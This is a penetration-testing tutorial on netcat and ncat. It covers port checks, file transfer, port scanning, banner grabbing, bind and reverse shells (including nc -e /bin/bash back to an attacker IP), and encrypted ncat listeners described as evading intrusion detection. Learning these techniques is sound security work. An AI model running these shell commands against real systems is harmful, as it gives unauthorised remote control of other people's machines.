### Netcat

As the man page says nc or netcat is a TCP/IP swiss army knife.

You can use this tool to read/write TCP/UDP port. This means that nc can act both as a client and a server.

Connecting to a TCP/UDP port can be useful in several situations:
- To check if a port is open or closed.
- To read a banner from the port.
- To connect to a network service manually

- To Check if Port is open:
root@kali:/home/greysec/scripts# nc -nv 192.168.1.9 80
(UNKNOWN) [192.168.1.9] 80 (http) open

root@kali:/home/greysec/scripts# nc -nv 192.168.1.9 110
(UNKNOWN) [192.168.1.9] 110 (pop3) : Connection refused

Sometimes you get more output than the above you are seeing, including banner info of the server that is running.

### Netcat as a server

root@kali:/home/greysec/scripts# nc -nlvp 1234
listening on [any] 1234 ...

### Netcat as a server

root@kali:/home/greysec/scripts# nc -nv 192.168.1.11 1234


If there is a server/target(192.168.1.1) listening on port 1234, it will get connected.
You can use this connection as a simple chat window:

root@kali:/home/greysec/scripts# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.11] 48344
hello
hellp


root@kali:/home/greysec/scripts# nc -nv 192.168.1.11 1234
(UNKNOWN) [192.168.1.11] 1234 (?) open
hello
hellp


In the above case, port is only opened in listening/server side.

### Transfer a file using nc:

#### C:\Users\offsec>nc -nlvp 4444 > incoming.exe

#### nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe

Netcat can also send stdin,stdout, and stderr output of any executable to a TCP/UDP port.

### Bind Shell:

A bind shell is a shell that binds to a specific port on the target host to listen for incoming connections

The steps to setup a bind shell are as following:

- Bind a bash shell to port 1234 using Netcat.
      - # nc -nlvp 1234 -e cmd.exe
- Connect to the target host on port 4444 from the attack box.
      - # nc -n 192.168.1.8 1234
- Issue commands on the target host from the attack box.

- Open the listening port 1234 and send the stdin,stdout and stderr of cmd.exe to the client.

C:\Users\greysec>nc -nlvp 1234 -e cmd.exe
listening on [any] 1234 ...
connect to [192.168.1.8] from (UNKNOWN) [192.168.1.11] 52552

- Now anyone can connect to this listening. Please make sure that firewall settings only allow only a particular host to connect once you open the listening port, otherwise any unknown person can connect to this which will be dangerous.

- Connect to above host:
root@kali:/home/greysec/scripts# nc -n 192.168.1.8 1234
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\greysec>

### Reverse Shell

In order to setup a Netcat reverse shell we need to follow the following steps:

- Setup a Netcat listener.
      - # nc –lvp 1234
- Connect to the Netcat listener from the target host.
      - nc 192.168.100.113 4444 –e /bin/bash
- Issue commands on the target host from the attack box.


- In Bind shell, tcp opens up a port on the victim's device. But, Usually a machine is behind a firewall (or NAT) and firewalls don't allow ports other than a few specific ones (like 80(http), 443(https), 22(ssh), etc) in the listening ports. So, in most of the cases, bind shell will not work.

- Reverse TCP tries to connect to you (from the target machine back to you: you open a port and wait for the connection). The attacking machine (yours) has a listener port on which it receives the connection, after which, code or command execution is achieved. If it is remotely, port forwarding should be done on your router.

Since the attacking machine is yours only, you can open any port, example: if you think that the target/victim machine is under firewall and there is only port 80 or 443 open, you can get the reverse shell by opening the listening port in your attacking machine. If your port 80 is already busy as http, then you can close apache2 service to free it and then open it in listening mode.

- It is important to realize that outgoing traffic can be just as harmful
as incoming traffic.

Port Scanning using nc:

### nc -v -n -z -w1 <target_address> <target_start_port>- <end_port>

-z -> this is to tell nc not to send any data

-w1 -> wait only 1 sec for a connection to occur, if you think due to strict firewall policies, it is taking time to connect bac, you should increase this number in that case.

Banner Grabbing:

### nc -v -n -w1 <target_address> <target_start_port>-<end_port>



During regular pentesting, you will find that the victim/target machine does not have nc installed or nc does not support -e option(target machine is having older nc version).

You can use following cheatsheet in those cases:

- Before running any command from cheatsheet make sure you know about target environment like whether python or perl or bash is available on target, can you use them.

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
https://highon.coffee/blog/reverse-shell-cheat-sheet/


## Ncat

Ncat is similar to nc in the aspect that ncat can also read and write data to TCP/UDP sockets.

But it has the ability to authenticate and encrypt incoming and outgoing connections.

Authentication helps in avoiding any unwanted IP address to connect to our system and enryption helps in bypassing intrusion detection system(IDS).

- ncat --exec cmd.exe --allow 192.168.1.10 -vnl 1234 --ssl

Above command will open listening port 1234 and allow only host with ip address 192.168.1.10 to connect to it, data exchange will be encrypted with ssl encryption

To connect to listener host:
- ncat -v 192.168.1.10 1234 --ssl
